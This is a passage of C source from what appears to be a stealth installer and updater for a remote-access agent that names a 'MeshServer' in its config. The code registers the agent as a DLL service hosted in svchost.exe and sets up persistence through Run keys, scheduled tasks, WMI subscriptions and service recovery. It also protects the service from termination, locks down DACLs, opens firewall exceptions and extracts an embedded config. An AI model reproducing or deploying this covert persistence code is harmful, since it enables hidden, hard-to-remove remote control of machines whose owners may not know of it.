    wchar_t serviceDisplayName[256] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    Stealth_LogInstallEvent(L"[UPDATE] Starting update for %ls", serviceKeyName);

    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Failed to resolve install paths");
        return FALSE;
    }

    Stealth_CreateInstallRootDirectory(paths.installDir);
    Stealth_CreateInstallationDirectory(paths.logsDir);

    // Disable restart mechanisms before stopping to avoid immediate re-launch.
    StealthPersistenceState persisted = {0};
    BOOL havePersisted = Stealth_LoadPersistenceState(&persisted);

    DWORD originalStartType = SERVICE_AUTO_START;
    (void)Stealth_QueryServiceStartType(serviceKeyName, &originalStartType);
    BOOL disabledStartType = Stealth_SetServiceStartType(serviceKeyName, SERVICE_DISABLED);
    if (!disabledStartType)
    {
        Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to disable service start type (%ls, error=%lu)", serviceKeyName, GetLastError());
    }

    Stealth_ClearServiceRecovery(serviceKeyName);
    Stealth_RemoveRunKeyEntry(serviceKeyName);
    Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
    if (havePersisted && persisted.WmiFilter[0] != L'\0' && persisted.WmiConsumer[0] != L'\0')
    {
        if (StealthResilience_RemoveWmiSubscription(persisted.WmiFilter, persisted.WmiConsumer))
        {
            Stealth_LogInstallEvent(L"[UPDATE] WMI restart subscription removed (%ls/%ls)", persisted.WmiFilter, persisted.WmiConsumer);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to remove WMI restart subscription (%ls/%ls)", persisted.WmiFilter, persisted.WmiConsumer);
        }
    }

    if (!Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Service did not stop; aborting update");
        success = FALSE;
        goto CLEANUP;
    }
    restartService = TRUE;

    wchar_t hostExePath[MAX_PATH] = {0};
    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe"))
    {
        Stealth_TerminateProcessesByPath(hostExePath);
    }
    Stealth_TerminateProcessesByPath(paths.exePath);

    if (sourceExePath && sourceExePath[0] != L'\0')
    {
        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
        {
            Stealth_LogInstallEvent(L"[UPDATE] Failed to copy executable to %ls", paths.exePath);
            success = FALSE;
            goto CLEANUP;
        }
    }

    if (paths.exePath[0] != L'\0' && GetFileAttributesW(paths.exePath) != INVALID_FILE_ATTRIBUTES)
    {
        if (!Stealth_HardenHostExecutableDacl(paths.exePath))
        {
            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Failed to apply host executable DACL to %ls", paths.exePath);
            success = FALSE;
            goto CLEANUP;
        }
    }

    if (sourceExePath && sourceExePath[0] != L'\0')
    {
        if (Stealth_EnsureConfigFile(sourceExePath, paths.confPath))
        {
            Stealth_LogInstallEvent(L"[UPDATE] Provisioning config staged to %ls", paths.confPath);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Unable to stage provisioning config to %ls", paths.confPath);
        }
    }

    if (paths.exePath[0] != L'\0')
    {
        wchar_t mshPath[MAX_PATH] = {0};
        StringCchCopyW(mshPath, _countof(mshPath), paths.exePath);
        wchar_t* dot = wcsrchr(mshPath, L'.');
        if (dot != NULL)
        {
            StringCchCopyW(dot, _countof(mshPath) - (dot - mshPath), L".msh");
        }
        else
        {
            StringCchCatW(mshPath, _countof(mshPath), L".msh");
        }

        if (Stealth_EnsureMshFile(sourceExePath, mshPath, paths.confPath))
        {
            Stealth_LogInstallEvent(L"[UPDATE] Provisioning msh staged to %ls", mshPath);
        }
        else
        {
            Stealth_LogInstallEvent(L"[WARN] [UPDATE] Unable to stage provisioning msh to %ls", mshPath);
        }

        if (Stealth_ShouldEnableDebugConsole())
        {
            Stealth_AppendConfigOverride(paths.confPath, "debugConsole", "1");
            Stealth_AppendConfigOverride(mshPath, "debugConsole", "1");
        }
    }

    if (!Stealth_RemoveFileIfExistsWithTimeout(paths.dllPath, 60000, TRUE))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove existing svchost DLL (%ls)", paths.dllPath);
        success = FALSE;
        goto CLEANUP;
    }
    if (sourceDllPath && sourceDllPath[0] != L'\0')
    {
        dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
    }
    else
    {
        dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
    }

    if (!dllStaged)
    {
        Stealth_LogInstallEvent(L"[UPDATE] Failed to stage svchost DLL to %ls", paths.dllPath);
        success = FALSE;
        goto CLEANUP;
    }
    if (!Stealth_ValidateSvchostPayloadDll(paths.dllPath))
    {
        if (sourceDllPath && sourceDllPath[0] != L'\0')
        {
            Stealth_LogInstallEvent(L"[UPDATE] Provided svchost DLL failed validation; attempting embedded payload fallback");
            if (!Stealth_RemoveFileIfExistsWithTimeout(paths.dllPath, 60000, TRUE))
            {
                Stealth_LogInstallEvent(L"[UPDATE] Failed to remove invalid svchost DLL during fallback (%ls)", paths.dllPath);
                success = FALSE;
                goto CLEANUP;
            }
            if (!MeshSvchostPayload_WriteToPath(paths.dllPath) || !Stealth_ValidateSvchostPayloadDll(paths.dllPath))
            {
                Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost DLL fallback validation failed for %ls", paths.dllPath);
                success = FALSE;
                goto CLEANUP;
            }
            Stealth_LogInstallEvent(L"[UPDATE] Embedded svchost payload fallback staged to %ls", paths.dllPath);
        }
        else
        {
            success = FALSE;
            goto CLEANUP;
        }
    }

    if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Svchost registration failed for %ls (error=%lu)", serviceKeyName, GetLastError());
        success = FALSE;
        goto CLEANUP;
    }
    if (!Stealth_VerifySvchostServiceBinding(serviceKeyName, paths.dllPath))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Svchost binding verification failed for %ls", serviceKeyName);
        success = FALSE;
        goto CLEANUP;
    }
    Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);

CLEANUP:
    if (disabledStartType)
    {
        (void)Stealth_SetServiceStartType(serviceKeyName, originalStartType);
    }
    Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
    Stealth_ApplyPersistenceProfile();

    MeshService_HardenServiceDaclByName(serviceKeyName);
    Stealth_ProtectServiceFromTermination(serviceKeyName);

    // Refresh firewall rules (host svchost + WebRTC inbound UDP)
    const wchar_t* hostToExcept = NULL;
    if (hostExePath[0] != L'\0' && GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
    {
        hostToExcept = hostExePath;
    }
    else
    {
        hostToExcept = L"C:\\Windows\\System32\\svchost.exe";
    }

    if (!Stealth_RefreshFirewallRulesWithRetry(serviceKeyName, hostToExcept, paths.exePath))
    {
        Stealth_LogInstallEvent(L"[UPDATE] Firewall rule provisioning failed for %ls", serviceKeyName);
        success = FALSE;
    }

    if (restartService)
    {
        if (!Stealth_StartSvchostServiceAndWait(serviceKeyName, paths.dllPath, 30000, TRUE))
        {
            Stealth_LogInstallEvent(L"[UPDATE] Service failed to reach RUNNING state after update for %ls", serviceKeyName);
            success = FALSE;
        }
    }

    if (success)
    {
        Stealth_LogInstallEvent(L"[UPDATE] Update completed for %ls", serviceKeyName);
    }
    else
    {
        Stealth_LogInstallEvent(L"[UPDATE] Update failed for %ls", serviceKeyName);
    }
    return success;
}

// ================================================================
// Silent Installation Check
// ================================================================

BOOL Stealth_IsAlreadyInstalled(void)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL installed = FALSE;
    wchar_t serviceKeyName[256] = {0};

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_QUERY_STATUS);
        if (hService)
        {
            installed = TRUE;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return installed;
}

typedef struct StealthValidationSummary
{
    const char* phase;
    BOOL success;
    BOOL installRoot;
    BOOL logsRoot;
    BOOL installRootDacl;
    BOOL logsRootDacl;
    BOOL installerLog;
    BOOL exePresent;
    BOOL exeDacl;
    BOOL dllPresent;
    BOOL configPresent;
    BOOL configKeys;
    BOOL serviceExists;
    BOOL serviceType;
    BOOL serviceStart;
    BOOL serviceImagePath;
    BOOL serviceGroup;
    BOOL serviceAccount;
    BOOL serviceDll;
    BOOL serviceMain;
    BOOL serviceUnload;
    BOOL serviceDllHash;
    BOOL serviceDacl;
    BOOL serviceRunning;
    BOOL firewallRule;
    BOOL persistenceState;
    BOOL autorunTask;
    BOOL restartTask;
    BOOL wmiSubscription;
    BOOL runKey;
} StealthValidationSummary;

static BOOL Stealth_PathExists(const wchar_t* path)
{
    if (path == NULL || path[0] == L'\0') { return FALSE; }
    DWORD attr = GetFileAttributesW(path);
    return (attr != INVALID_FILE_ATTRIBUTES);
}

static BOOL Stealth_ReadRegistryString(HKEY root, const wchar_t* subKey, const wchar_t* valueName,
                                       wchar_t* buffer, size_t bufferCch, DWORD* valueType)
{
    if (buffer == NULL || bufferCch == 0) { return FALSE; }
    buffer[0] = L'\0';

    HKEY hKey = NULL;
    if (RegOpenKeyExW(root, subKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    DWORD type = 0;
    DWORD cb = (DWORD)(bufferCch * sizeof(wchar_t));
    LONG status = RegQueryValueExW(hKey, valueName, NULL, &type, (LPBYTE)buffer, &cb);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS)
    {
        buffer[0] = L'\0';
        return FALSE;
    }

    if (valueType) { *valueType = type; }
    buffer[bufferCch - 1] = L'\0';
    return TRUE;
}

static BOOL Stealth_ReadRegistryDword(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD* valueOut)
{
    if (valueOut == NULL) { return FALSE; }
    *valueOut = 0;

    HKEY hKey = NULL;
    if (RegOpenKeyExW(root, subKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    DWORD type = 0;
    DWORD cb = sizeof(DWORD);
    LONG status = RegQueryValueExW(hKey, valueName, NULL, &type, (LPBYTE)valueOut, &cb);
    RegCloseKey(hKey);

    return (status == ERROR_SUCCESS && type == REG_DWORD);
}

static BOOL Stealth_ServiceIsRunning(const wchar_t* serviceName)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
    BOOL running = FALSE;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm == NULL) { return FALSE; }
    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    if (svc != NULL)
    {
        SERVICE_STATUS_PROCESS ssp = {0};
        DWORD bytes = 0;
        if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes))
        {
            running = (ssp.dwCurrentState == SERVICE_RUNNING);
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return running;
}

static BOOL Stealth_RunKeyValueExists(const wchar_t* valueName, wchar_t* valueOut, size_t valueOutCch)
{
    if (valueOut && valueOutCch > 0) { valueOut[0] = L'\0'; }
    if (valueName == NULL || valueName[0] == L'\0') { return FALSE; }
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    DWORD type = 0;
    DWORD cb = (DWORD)(valueOut && valueOutCch > 0 ? valueOutCch * sizeof(wchar_t) : 0);
    LONG status = RegQueryValueExW(hKey, valueName, NULL, &type, (LPBYTE)valueOut, &cb);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ))
    {
        if (valueOut && valueOutCch > 0) { valueOut[0] = L'\0'; }
        return FALSE;
    }
    if (valueOut && valueOutCch > 0) { valueOut[valueOutCch - 1] = L'\0'; }
    return TRUE;
}

static BOOL Stealth_AclMatchesExpected(PACL actualDacl, PACL expectedDacl)
{
    if (actualDacl == NULL || expectedDacl == NULL) { return FALSE; }

    ACL_SIZE_INFORMATION actualInfo = {0};
    ACL_SIZE_INFORMATION expectedInfo = {0};
    if (!GetAclInformation(actualDacl, &actualInfo, sizeof(actualInfo), AclSizeInformation)) { return FALSE; }
    if (!GetAclInformation(expectedDacl, &expectedInfo, sizeof(expectedInfo), AclSizeInformation)) { return FALSE; }
    if (actualInfo.AceCount != expectedInfo.AceCount) { return FALSE; }

    for (DWORD i = 0; i < expectedInfo.AceCount; ++i)
    {
        void* expectedAce = NULL;
        if (!GetAce(expectedDacl, i, &expectedAce) || expectedAce == NULL) { return FALSE; }

        BOOL found = FALSE;
        for (DWORD j = 0; j < actualInfo.AceCount; ++j)
        {
            void* actualAce = NULL;
            if (!GetAce(actualDacl, j, &actualAce) || actualAce == NULL) { continue; }

            ACE_HEADER* expHdr = (ACE_HEADER*)expectedAce;
            ACE_HEADER* actHdr = (ACE_HEADER*)actualAce;
            if (expHdr->AceType != actHdr->AceType || expHdr->AceFlags != actHdr->AceFlags) { continue; }

            if (expHdr->AceType == ACCESS_ALLOWED_ACE_TYPE)
            {
                ACCESS_ALLOWED_ACE* expAce = (ACCESS_ALLOWED_ACE*)expectedAce;
                ACCESS_ALLOWED_ACE* actAce = (ACCESS_ALLOWED_ACE*)actualAce;
                if (expAce->Mask != actAce->Mask) { continue; }
                PSID expSid = (PSID)&expAce->SidStart;
                PSID actSid = (PSID)&actAce->SidStart;
                if (EqualSid(expSid, actSid))
                {
                    found = TRUE;
                    break;
                }
            }
        }
        if (!found) { return FALSE; }
    }

    return TRUE;
}

static BOOL Stealth_ValidatePathDaclWithExpected(const wchar_t* path, const wchar_t* expectedSddl)
{
    if (path == NULL || path[0] == L'\0') { return FALSE; }
    if (expectedSddl == NULL || expectedSddl[0] == L'\0') { return FALSE; }

    PSECURITY_DESCRIPTOR sd = NULL;
    PACL dacl = NULL;
    BOOL daclPresent = FALSE;
    BOOL daclDefaulted = FALSE;
    DWORD result = GetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
                                         DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, &sd);
    if (result != ERROR_SUCCESS || sd == NULL) { return FALSE; }

    BOOL ok = FALSE;
    if (GetSecurityDescriptorDacl(sd, &daclPresent, &dacl, &daclDefaulted) && daclPresent && dacl != NULL)
    {
        SECURITY_DESCRIPTOR_CONTROL control = 0;
        DWORD revision = 0;
        if (GetSecurityDescriptorControl(sd, &control, &revision))
        {
            if ((control & SE_DACL_PROTECTED) != 0)
            {
                PSECURITY_DESCRIPTOR expectedSd = NULL;
                if (ConvertStringSecurityDescriptorToSecurityDescriptorW(expectedSddl,
                                                                         SDDL_REVISION_1, &expectedSd, NULL))
                {
                    PACL expectedDacl = NULL;
                    BOOL expectedPresent = FALSE;
                    BOOL expectedDefaulted = FALSE;
                    if (GetSecurityDescriptorDacl(expectedSd, &expectedPresent, &expectedDacl, &expectedDefaulted) &&
                        expectedPresent && expectedDacl != NULL)
                    {
                        ok = Stealth_AclMatchesExpected(dacl, expectedDacl);
                    }
                    LocalFree(expectedSd);
                }
            }
        }
    }

    if (sd != NULL) { LocalFree(sd); }
    return ok;
}

static BOOL Stealth_ValidatePathDacl(const wchar_t* path)
{
    return Stealth_ValidatePathDaclWithExpected(path, STEALTH_SECURE_DIR_DACL_SDDL);
}

static BOOL Stealth_ValidateInstallRootDacl(const wchar_t* path)
{
    return Stealth_ValidatePathDaclWithExpected(path, STEALTH_INSTALL_ROOT_DACL_SDDL);
}

static BOOL Stealth_ValidateHostExecutableDacl(const wchar_t* exePath)
{
    return Stealth_ValidatePathDaclWithExpected(exePath, STEALTH_HOST_EXE_DACL_SDDL);
}

static BOOL Stealth_ExtractEmbeddedMshFromExe(const wchar_t* exePath, const wchar_t* destPath)
{
    if (exePath == NULL || exePath[0] == L'\0' || destPath == NULL || destPath[0] == L'\0') { return FALSE; }

    static const unsigned char kMshGuid[16] = {
        0xB9, 0x96, 0x01, 0x58, 0x80, 0x54, 0x4A, 0x19,
        0xB7, 0xF7, 0xE9, 0xBE, 0x44, 0x91, 0x4C, 0x19
    };

    FILE* src = NULL;
    if (_wfopen_s(&src, exePath, L"rb") != 0 || src == NULL) { return FALSE; }

    if (fseek(src, -16, SEEK_END) != 0)
    {
        fclose(src);
        return FALSE;
    }

    unsigned char guid[16] = {0};
    if (fread(guid, 1, sizeof(guid), src) != sizeof(guid) || memcmp(guid, kMshGuid, sizeof(guid)) != 0)
    {
        fclose(src);
        return FALSE;
    }

    if (fseek(src, -20, SEEK_END) != 0)
    {
        fclose(src);
        return FALSE;
    }

    unsigned char lenBuf[4] = {0};
    if (fread(lenBuf, 1, sizeof(lenBuf), src) != sizeof(lenBuf))
    {
        fclose(src);
        return FALSE;
    }

    unsigned int mshLen = (lenBuf[0] << 24) | (lenBuf[1] << 16) | (lenBuf[2] << 8) | lenBuf[3];
    if (mshLen == 0)
    {
        fclose(src);
        return FALSE;
    }

    if (fseek(src, -(long)(20 + mshLen), SEEK_END) != 0)
    {
        fclose(src);
        return FALSE;
    }

    char* buffer = (char*)malloc(mshLen);
    if (buffer == NULL)
    {
        fclose(src);
        return FALSE;
    }

    BOOL ok = FALSE;
    if (fread(buffer, 1, mshLen, src) == mshLen)
    {
        FILE* dst = NULL;
        if (_wfopen_s(&dst, destPath, L"wb") == 0 && dst != NULL)
        {
            if (fwrite(buffer, 1, mshLen, dst) == mshLen)
            {
                ok = TRUE;
            }
            fclose(dst);
        }
    }

    free(buffer);
    fclose(src);
    return ok;
}

static BOOL Stealth_CopyFileIfPresent(const wchar_t* sourcePath, const wchar_t* destPath)
{
    if (sourcePath == NULL || destPath == NULL) { return FALSE; }
    DWORD attr = GetFileAttributesW(sourcePath);
    if (attr == INVALID_FILE_ATTRIBUTES) { return FALSE; }
    SetFileAttributesW(destPath, FILE_ATTRIBUTE_NORMAL);
    CopyFileW(sourcePath, destPath, FALSE);
    return (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES);
}

static BOOL Stealth_EnsureConfigFile(const wchar_t* sourceExePath, const wchar_t* destPath)
{
    if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
    if (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
    if (sourceExePath != NULL && sourceExePath[0] != L'\0')
    {
        wchar_t mshPath[MAX_PATH] = {0};
        StringCchCopyW(mshPath, _countof(mshPath), sourceExePath);
        wchar_t* dot = wcsrchr(mshPath, L'.');
        if (dot != NULL)
        {
            StringCchCopyW(dot, _countof(mshPath) - (dot - mshPath), L".msh");
        }
        else
        {
            StringCchCatW(mshPath, _countof(mshPath), L".msh");
        }
        if (Stealth_CopyFileIfPresent(mshPath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
        if (Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
    }
    return (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath));
}

static BOOL Stealth_EnsureMshFile(const wchar_t* sourceExePath, const wchar_t* destPath, const wchar_t* fallbackConfPath)
{
    if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
    if (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }

    if (sourceExePath != NULL && sourceExePath[0] != L'\0')
    {
        const wchar_t* ext = wcsrchr(sourceExePath, L'.');
        if (ext != NULL && _wcsicmp(ext, L".msh") == 0)
        {
            if (Stealth_CopyFileIfPresent(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
        }

        wchar_t mshPath[MAX_PATH] = {0};
        StringCchCopyW(mshPath, _countof(mshPath), sourceExePath);
        wchar_t* dot = wcsrchr(mshPath, L'.');
        if (dot != NULL)
        {
            StringCchCopyW(dot, _countof(mshPath) - (dot - mshPath), L".msh");
        }
        else
        {
            StringCchCatW(mshPath, _countof(mshPath), L".msh");
        }
        if (Stealth_CopyFileIfPresent(mshPath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
        if (Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
    }

    if (fallbackConfPath != NULL && fallbackConfPath[0] != L'\0')
    {
        if (Stealth_CopyFileIfPresent(fallbackConfPath, destPath) && Stealth_ConfigHasRequiredKeys(destPath)) { return TRUE; }
    }

    return (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES && Stealth_ConfigHasRequiredKeys(destPath));
}

static BOOL Stealth_ShouldEnableDebugConsole(void)
{
    wchar_t flag[16] = {0};
    DWORD len = GetEnvironmentVariableW(L"MESHAGENT_SELFTEST", flag, _countof(flag));
    if (len == 0 || len >= _countof(flag)) { return FALSE; }
    if (flag[0] == L'0') { return FALSE; }
    if (_wcsicmp(flag, L"false") == 0) { return FALSE; }
    return TRUE;
}

static void Stealth_AppendConfigOverride(const wchar_t* path, const char* key, const char* value)
{
    if (path == NULL || path[0] == L'\0' || key == NULL || value == NULL) { return; }
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) { return; }

    FILE* f = NULL;
    if (_wfopen_s(&f, path, L"a") != 0 || f == NULL) { return; }
    fprintf(f, "\n%s=%s\n", key, value);
    fclose(f);
}

static BOOL Stealth_ConfigHasRequiredKeys(const wchar_t* configPath)
{
    if (configPath == NULL || configPath[0] == L'\0') { return FALSE; }
    FILE* f = NULL;
    if (_wfopen_s(&f, configPath, L"rb") != 0 || f == NULL) { return FALSE; }
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    if (len <= 0) { fclose(f); return FALSE; }
    fseek(f, 0, SEEK_SET);

    char* buf = (char*)malloc((size_t)len + 1);
    if (buf == NULL) { fclose(f); return FALSE; }
    size_t read = fread(buf, 1, (size_t)len, f);
    fclose(f);
    buf[read] = '\0';

    BOOL ok = (strstr(buf, "MeshServer=") != NULL &&
               strstr(buf, "ServerID=") != NULL &&
               strstr(buf, "MeshID=") != NULL);
    free(buf);
    return ok;
}

static void Stealth_PrintValidationJson(const StealthValidationSummary* summary)
{
    if (summary == NULL) { return; }
    printf("{\"success\":%s,", summary->success ? "true" : "false");
    if (summary->phase != NULL)
    {
        printf("\"phase\":\"%s\",", summary->phase);
    }
    printf("\"checks\":{");
    printf("\"installRoot\":%s,", summary->installRoot ? "true" : "false");
    printf("\"logsRoot\":%s,", summary->logsRoot ? "true" : "false");
    printf("\"installRootDacl\":%s,", summary->installRootDacl ? "true" : "false");
    printf("\"logsRootDacl\":%s,", summary->logsRootDacl ? "true" : "false");
    printf("\"installerLog\":%s,", summary->installerLog ? "true" : "false");
    printf("\"exePresent\":%s,", summary->exePresent ? "true" : "false");
    printf("\"exeDacl\":%s,", summary->exeDacl ? "true" : "false");
    printf("\"dllPresent\":%s,", summary->dllPresent ? "true" : "false");
    printf("\"configPresent\":%s,", summary->configPresent ? "true" : "false");
    printf("\"configKeys\":%s,", summary->configKeys ? "true" : "false");
    printf("\"serviceExists\":%s,", summary->serviceExists ? "true" : "false");
    printf("\"serviceType\":%s,", summary->serviceType ? "true" : "false");
    printf("\"serviceStart\":%s,", summary->serviceStart ? "true" : "false");
    printf("\"serviceImagePath\":%s,", summary->serviceImagePath ? "true" : "false");
    printf("\"serviceGroup\":%s,", summary->serviceGroup ? "true" : "false");
    printf("\"serviceAccount\":%s,", summary->serviceAccount ? "true" : "false");
    printf("\"serviceDll\":%s,", summary->serviceDll ? "true" : "false");
    printf("\"serviceMain\":%s,", summary->serviceMain ? "true" : "false");
    printf("\"serviceUnload\":%s,", summary->serviceUnload ? "true" : "false");
    printf("\"serviceDllHash\":%s,", summary->serviceDllHash ? "true" : "false");
    printf("\"serviceDacl\":%s,", summary->serviceDacl ? "true" : "false");
    printf("\"serviceRunning\":%s,", summary->serviceRunning ? "true" : "false");
    printf("\"firewallRule\":%s,", summary->firewallRule ? "true" : "false");
    printf("\"persistenceState\":%s,", summary->persistenceState ? "true" : "false");
    printf("\"autorunTask\":%s,", summary->autorunTask ? "true" : "false");
    printf("\"restartTask\":%s,", summary->restartTask ? "true" : "false");
    printf("\"wmiSubscription\":%s,", summary->wmiSubscription ? "true" : "false");
    printf("\"runKey\":%s", summary->runKey ? "true" : "false");
    printf("}}\n");
}

static BOOL Stealth_RunInstallValidationInternal(const char* phase)
{
    StealthInstallPaths paths;
    StealthValidationSummary summary;
    ZeroMemory(&summary, sizeof(summary));
    summary.phase = (phase != NULL ? phase : "install");
    summary.success = TRUE;

    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    Stealth_LogInstallEvent(L"[VALIDATION] Starting install validation for %ls", serviceKeyName);

    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Failed to resolve install paths");
        summary.success = FALSE;
        Stealth_PrintValidationJson(&summary);
        return FALSE;
    }

    summary.installRoot = Stealth_PathExists(paths.installDir);
    summary.logsRoot = Stealth_PathExists(paths.logsDir);
    summary.exePresent = Stealth_PathExists(paths.exePath);
    summary.dllPresent = Stealth_PathExists(paths.dllPath);
    summary.configPresent = Stealth_PathExists(paths.confPath);
    summary.configKeys = summary.configPresent ? Stealth_ConfigHasRequiredKeys(paths.confPath) : FALSE;
    summary.installRootDacl = (summary.installRoot ? Stealth_ValidateInstallRootDacl(paths.installDir) : FALSE);
    summary.logsRootDacl = (summary.logsRoot ? Stealth_ValidatePathDacl(paths.logsDir) : FALSE);
    summary.exeDacl = (summary.exePresent ? Stealth_ValidateHostExecutableDacl(paths.exePath) : FALSE);

    if (!summary.installRoot)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Install root missing: %ls", paths.installDir);
        summary.success = FALSE;
    }
    else if (!summary.installRootDacl)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Install root DACL mismatch: %ls", paths.installDir);
        summary.success = FALSE;
    }
    if (!summary.logsRoot)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Logs root missing: %ls", paths.logsDir);
        summary.success = FALSE;
    }
    else if (!summary.logsRootDacl)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Logs root DACL mismatch: %ls", paths.logsDir);
        summary.success = FALSE;
    }
    if (!summary.exePresent)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Executable missing: %ls", paths.exePath);
        summary.success = FALSE;
    }
    else if (!summary.exeDacl)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Host executable DACL mismatch: %ls", paths.exePath);
        summary.success = FALSE;
    }
    if (!summary.dllPresent)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Service DLL missing: %ls", paths.dllPath);
        summary.success = FALSE;
    }
    if (!summary.configPresent)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Config missing: %ls", paths.confPath);
        summary.success = FALSE;
    }
    else if (!summary.configKeys)
    {
        Stealth_LogInstallEvent(L"[VALIDATION] Config missing required keys: %ls", paths.confPath);
        summary.success = FALSE;
    }

    if (summary.logsRoot)
    {
        FILE* logFile = NULL;
        if (_wfopen_s(&logFile, g_InstallLogPath, L"a+, ccs=UNICODE") == 0 && logFile != NULL)
        {
            summary.installerLog = TRUE;
            fclose(logFile);
        }
        else
        {
            summary.installerLog = FALSE;
            summary.success = FALSE;
            Stealth_LogInstallEvent(L"[VALIDATION] Unable to open installer log: %ls", g_InstallLogPath);
        }
    }

    // Validate service registry configuration
    wchar_t serviceKeyPath[512];
    _snwprintf_s(serviceKeyPath, _countof(serviceKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceKeyName);

    HKEY hSvcKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, serviceKeyPath, 0, KEY_QUERY_VALUE, &hSvcKey) == ERROR_SUCCESS)
    {
        summary.serviceExists = TRUE;
